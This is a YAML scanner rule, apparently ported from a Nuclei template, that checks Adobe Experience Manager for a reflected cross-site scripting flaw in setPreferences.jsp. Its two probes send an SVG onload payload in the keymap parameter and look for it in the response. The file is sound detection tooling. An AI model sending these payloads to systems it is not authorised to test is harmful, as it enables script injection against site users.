schema_version: 1
id: "cortex.community:aem-setpreferences-xss"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Adobe Experience Manager - Cross-Site Scripting"
  description: "Adobe Experience Manager contains a cross-site scripting vulnerability via setPreferences. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.youtube.com/watch?v=VwLSUHNhrOw&t=142s"
    - "https://github.com/projectdiscovery/nuclei-templates/issues/3225"
    - "https://twitter.com/zin_min_phyo/status/1465394815042916352"
  cwes: [79]
  tags: ["aem", "xss", "misconfig", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a" }
  - id: "probe1"
    request: { method: "GET", path: "/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a" }
proof:
  kind: "signal.v1"
  assertions:
    any:
      - all:
          - all:
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<svg/onload=confirm(document.domain);>" } }
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "A JSONObject text must begin with" } }
          - eq: { left: { ref: "steps.probe0.status" }, right: { value: 400 } }
      - all:
          - all:
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "<svg/onload=confirm(document.domain);>" } }
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "A JSONObject text must begin with" } }
          - eq: { left: { ref: "steps.probe1.status" }, right: { value: 400 } }
